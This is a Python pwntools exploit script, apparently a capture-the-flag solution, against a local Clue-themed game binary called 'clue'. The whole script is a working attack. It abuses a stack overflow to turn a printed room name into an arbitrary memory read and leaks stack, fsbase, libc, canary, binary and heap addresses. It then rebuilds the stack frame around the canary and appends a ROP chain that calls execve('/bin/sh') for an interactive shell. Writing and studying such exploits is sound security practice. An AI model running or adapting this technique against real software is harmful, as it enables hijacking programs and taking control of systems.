from pwn import *

def contains_whitespace_byte(val):
	b = val.to_bytes((val.bit_length() + 7) // 8, 'little')
	return any(byte in b for byte in (0x20, 0x0a, 0x09))

def contains_whitespace_byte_excl_lsb(val):
	b = val.to_bytes(8, 'little')
	b_to_check = b[2:]
	return any(byte in b_to_check for byte in (0x20, 0x0a, 0x09))

def pack_room(n, e, s, w, name, items, characters):
	return struct.pack('<QQQQQQQ', n, e, s, w, name, items, characters)

def replace_last_addr(payload, addr):
	return payload[:-8] + p64(addr)

def read_room_name():
	p.recvuntil(b'Room name: ')
	return p.recvline()[:-1]

def send_payload(payload):
	p.sendline(payload + b'\nroom\n')

#context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'], binary=ELF('./clue_inventory_gcc9'), aslr=True)
context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'], binary=ELF('./clue'), aslr=True)

elf = context.binary
libc = elf.libc

buf_static = b'A' * 32 * 8
stack_static = b'B' * 9 * 8

items = [b'dagger', b'pipe', b'wrench', b'revolver', b'rope', b'', b'(null)', b'hall', b'ginormous_purple_candlestick_of_doom', b'kitchen', b'study', b'conservatory', b'lounge', b'library', b'billiards', b'White', b'ballroom', b'worcester', b'Peacock', b'\x10']

item_locs = {'ginormous_purple_candlestick_of_doom': 0x30d8, 'dagger': 0x30fd, 'pipe': 0x3104, 'revolver': 0x3109, 'rope': 0x3112, 'wrench': 0x3117}
char_locs = {'Scarlet': 0x311e, 'Mustard': 0x3126, 'White': 0x312e, 'Plum': 0x3134, 'Peacock': 0x3139}
room_locs = {'kitchen': 0x3088, 'ballroom': 0x3090, 'conservatory': 0x3099, 'worcester': 0x30a6, 'billiards': 0x30b0, 'library': 0x30ba, 'lounge': 0x30c2, 'hall': 0x30c9, 'study': 0x30ce}

while True:

	payload  = buf_static + stack_static
	payload += p64(0x0)				# player_inventory

	p = process(context.binary.path)

	# overwrite LSB of current_room to get current_room->name = stack address
	p.recvuntil(b'Characters:')

	send_payload(payload)

	stack_peek = read_room_name()

	if stack_peek in items or not hex(int.from_bytes(stack_peek, 'little')).startswith('0x7f'):
		p.close()
		continue

	stack_peek = int.from_bytes(stack_peek, 'little')
	print('[+] Stack Peek:	', hex(stack_peek))

	offset = 0
	stack_val = b''

	# increment current_room by -0x8 until we reach the string Peacock
	# once we hit Peacock, we know exactly where we are on the stack compared to everything else in the stack frame
	try:

		while stack_val != b'Peacock':

			payload += p64(stack_peek + offset)	# current_room
			send_payload(payload)

			stack_val = read_room_name()

			offset -= 8
			payload = payload[:-8:]

	except EOFError:
		p.close()
		continue

	# once we know where we are on the stack, set current_room->name to be the stack address of the pointer to the page fsbase is in
	offset -= 8 * 4

	payload += p64(stack_peek + offset)
	send_payload(payload)

	addr_in_fsbase_page = int.from_bytes(read_room_name(), 'little') #- 0x38f10

	# print what that pointer points to, a closer and more reliable way of getting fsbase
	offset -= 8 * 24

	payload = replace_last_addr(payload, stack_peek + offset)
	payload += p64(addr_in_fsbase_page)

	send_payload(payload)

	fsbase = int.from_bytes(read_room_name(), 'little') + 0x1020

	if len(hex(fsbase)) != 14:
		p.close()
		continue

	print("[+] fsbase:	", hex(fsbase))

	# start of libc is fixed address away from fsbase, calculate libc base
	libc.address = fsbase - 0x1f3540
	print('[+] libc base:	', hex(libc.address))

	# set current_room->name to point to the stack variable below current_room
	# set current_room->name = fabase + 0x29 to print out the canary and avoid canary null byte
	payload = payload[:-8]
	payload = replace_last_addr(payload, stack_peek + offset)
	payload += p64(fsbase + 0x29)
	send_payload(payload)

	p.recvuntil(b'Room name: ')
	canary = int.from_bytes(b'\x00' + p.recvline()[:7:], 'little')

	# this usually occurs when the canary has a null byte in the rest of its 7 bytes
	if len(hex(canary)) != 18 or contains_whitespace_byte(canary):
		p.close()
		continue

	print("[+] Canary:	", hex(canary))

	# set current_room->name = stack_address of global variable and get binary base
	offset += 8 * 3

	payload = replace_last_addr(payload, stack_peek + offset + 0x150)
	send_payload(payload)

	binary_base = (int.from_bytes(read_room_name(), 'little') & 0xFFFFFFFFFFFFF000) - 0x3000

	if contains_whitespace_byte_excl_lsb(binary_base):
		p.close()
		continue

	#if contains_whitespace_byte(binary_base + 0x3000) or contains_whitespace_byte(binary_base + 0x3100):
	#	print("BE CAREFUL, HAVE WHITESPACE")

	print('[+] Binary base:', hex(binary_base))

	payload = payload[:-8]
	room_count = 0

	found_heap = 0
	heap_contains_whitespace = 0

	# find a room with both a character and an item in it
	while True:

		if heap_contains_whitespace:
			break

		payload = replace_last_addr(payload, stack_peek + offset + 0x1b8)
		send_payload(payload)

		heap_peek = p.recvline()[-7:-1]

		if heap_peek == b'(null)':
			offset += 0x38
			room_count += 1
			continue

		found_heap = 1

		heap_peek = int.from_bytes(heap_peek, 'little') #& 0xFFFFFFFFFFFFF000

		if found_heap and contains_whitespace_byte_excl_lsb(heap_peek):
			found_heap = 0
			heap_contains_whitespace = 1

		payload = replace_last_addr(payload, stack_peek + offset + 0x1c0)
		send_payload(payload)

		p.recvuntil(b'Room name: ')
		has_char = p.recvline()[-7:-1]

		# if theres no character in the room or the address we sent contains a newline character
		if has_char == b'(null)' or hex(int.from_bytes(has_char, 'little')).startswith('0x7f'):
			offset += 0x38
			room_count += 1
			continue

		has_char = int.from_bytes(has_char, 'little')

		# find the name of the chosen room
		if contains_whitespace_byte(stack_peek + offset + 0x1b0):
			offset += 0x38
			room_count += 1
			continue

		payload = replace_last_addr(payload, stack_peek + offset + 0x1b0)
		send_payload(payload)

		room = read_room_name().decode()
		break

	# if the heap address contains whitespace or we didnt find a valid room
	if heap_contains_whitespace or room_count >= 9:
		p.close()
		continue

	print('[+] Heap peek:	', heap_peek)
	print('[+] Room:	', room)

	# find the item name in the chosen room
	payload = replace_last_addr(payload, heap_peek - 0x40)	# room item
	send_payload(payload)

	item = read_room_name().decode()
	print("[+] Item:	", item)

	# find the character name in the chosen room
	payload = replace_last_addr(payload, has_char - 0x40)
	send_payload(payload)

	character = read_room_name().decode()
	print("[+] Character:	", character)

	# gadgets
	pop_rax_ret = p64(libc.address + 0x36174)
	pop_rdi_ret = p64(libc.address + 0x23b6a)
	pop_rsi_ret = p64(libc.address + 0x2601f)
	binsh = p64(next(libc.search(b'/bin/sh\x00')))
	syscall = p64(libc.address + 0x630a9)

	payload = payload[:-16:]
	payload += p64(heap_peek - 0x20)				# inventory
	payload += p64(stack_peek + offset + 0x1b0)			# current_room
	payload += p64(fsbase)						# chosen_item
	payload += p64(binary_base + room_locs[room])			# answer_room = room
	payload += p64(binary_base + item_locs[item])			# answer_item = room item
	payload += p64(binary_base + char_locs[character])		# answer_char = room character
	payload += p64(stack_peek + offset - (room_count * 0x38) - 0x150)	# input
	payload += p64(heap_peek)					# character
	payload += p64(0x0)						# right_room
	payload += p64(0x0)						# right_character
	payload += p64(0x0)						# right_item
	payload += p64(0x0)						# result_1
	payload += p64(0x0)						# result
	payload += pack_room(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0)		# default_room
	payload += p64(0x0)						# padding for alignment
	payload += p64(0x700000000)					# positions[0]-[1]
	payload += p64(0x100000008)					# positions[2]-[3]
	payload += p64(0x300000002)					# positions[4]-[5]
	payload += p64(0x600000005)					# positions[6]-[7]
	payload += p64(0x7fa900004)					# positions[8] + padding
	payload += p64(fsbase)						# padding
	payload += p64(binary_base + char_locs['Scarlet'])		# character_names[0]
	payload += p64(binary_base + char_locs['Mustard'])		# character_names[1]
	payload += p64(binary_base + char_locs['White'])		# character_names[2]
	payload += p64(binary_base + char_locs['Plum'])			# character_names[3]
	payload += p64(binary_base + char_locs['Peacock'])		# character_names[4]
	payload += p64(0x0)						# character_names[5]
	payload += p64(stack_peek + offset + 0x1b0)			# character_positions[0]
	payload += p64(stack_peek + offset + 0x1b0)			# character_positions[1]
	payload += p64(stack_peek + offset + 0x1b0)			# character_positions[2]
	payload += p64(stack_peek + offset + 0x1b0)			# character_positions[3]
	payload += p64(stack_peek + offset + 0x1b0)			# character_positions[4]
	payload += p64(0x0)						# character_positions[5]
	payload += p64(binary_base + item_locs['ginormous_purple_candlestick_of_doom'])	# item_names[0]
	payload += p64(binary_base + item_locs['dagger'])		# item_names[1]
	payload += p64(binary_base + item_locs['pipe'])			# item_names[2]
	payload += p64(binary_base + item_locs['rope'])			# item_names[3]
	payload += p64(binary_base + item_locs['rope'])			# item_names[4]
	payload += p64(binary_base + item_locs['wrench'])		# item_names[5]
	payload += p64(binary_base + room_locs['kitchen'])		# room_names[0]
	payload += p64(binary_base + room_locs['ballroom'])		# room_names[1]
	payload += p64(binary_base + room_locs['conservatory'])		# room_names[2]
	payload += p64(binary_base + room_locs['worcester'])		# room_names[3]
	payload += p64(binary_base + room_locs['billiards'])		# room_names[4]
	payload += p64(binary_base + room_locs['library'])		# room_names[5]
	payload += p64(binary_base + room_locs['lounge'])		# room_names[6]
	payload += p64(binary_base + room_locs['hall'])			# room_names[7]
	payload += p64(binary_base + room_locs['study'])		# room_names[8]
	payload += p64(0x1)						# padding
	payload += pack_room(0x0, 0x0, 0x0, 0x0, binary_base + room_locs[room], heap_peek - 0x20, has_char - 0x20)	# r[0]
	payload += pack_room(0x0, 0x0, 0x0, 0x0, binary_base + room_locs[room], heap_peek - 0x20, has_char - 0x20)	# r[1]
	payload += pack_room(0x0, 0x0, 0x0, 0x0, binary_base + room_locs[room], heap_peek - 0x20, has_char - 0x20)	# r[2]
	payload += pack_room(0x0, 0x0, 0x0, 0x0, binary_base + room_locs[room], heap_peek - 0x20, has_char - 0x20)	# r[3]
	payload += pack_room(0x0, 0x0, 0x0, 0x0, binary_base + room_locs[room], heap_peek - 0x20, has_char - 0x20)	# r[4]
	payload += pack_room(0x0, 0x0, 0x0, 0x0, binary_base + room_locs[room], heap_peek - 0x20, has_char - 0x20)	# r[5]
	payload += pack_room(0x0, 0x0, 0x0, 0x0, binary_base + room_locs[room], heap_peek - 0x20, has_char - 0x20)	# r[6]
	payload += pack_room(0x0, 0x0, 0x0, 0x0, binary_base + room_locs[room], heap_peek - 0x20, has_char - 0x20)	# r[7]
	payload += pack_room(0x0, 0x0, 0x0, 0x0, binary_base + room_locs[room], heap_peek - 0x20, has_char - 0x20)	# r[8]
	payload += p64(canary)						# canary
	payload += p64(stack_peek + offset + ((9 - room_count) * 0x38))	# idk
	payload += p64(binary_base + 0x2d60)				# idk
	payload += p64(0x0)						# rbp

	payload += pop_rax_ret						# return address
	payload += p64(0x3b)
	payload += pop_rdi_ret
	payload += binsh
	payload += pop_rsi_ret
	payload += p64(0x0)
	payload += syscall

	p.sendline(payload)
	p.sendline(b'clue\n' + character.encode() + b'\n' + item.encode())

	break

p.interactive()
